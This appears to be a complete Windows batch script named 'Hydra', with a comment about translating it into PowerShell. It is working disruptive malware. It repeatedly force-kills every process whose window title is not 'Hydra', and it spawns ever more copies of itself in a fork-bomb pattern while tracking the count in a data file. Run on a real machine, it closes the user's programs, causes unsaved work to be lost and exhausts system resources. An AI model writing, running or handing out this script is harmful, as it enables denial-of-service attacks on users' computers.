@ECHO OFF
::Ok. Start translating into powershell.
TITLE Hydra 
set n=0
:begin
set /a n+=1
if not exist data.txt type nul > data.txt
Findstr /m "%n%" data.txt
if %errorlevel%==0 (
goto :begin
)
:loop 
FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq Hydra" ^| find/c "exe"`) DO (
SET windowcount=%%F
)
TASKKILL /F /FI "WINDOWTITLE ne Hydra"
IF "%windowcount%"=="%n%" (
START Hydra.bat
START Hydra.bat
set /a n+=1
Echo %n% > data.txt
)
GOTO :loop
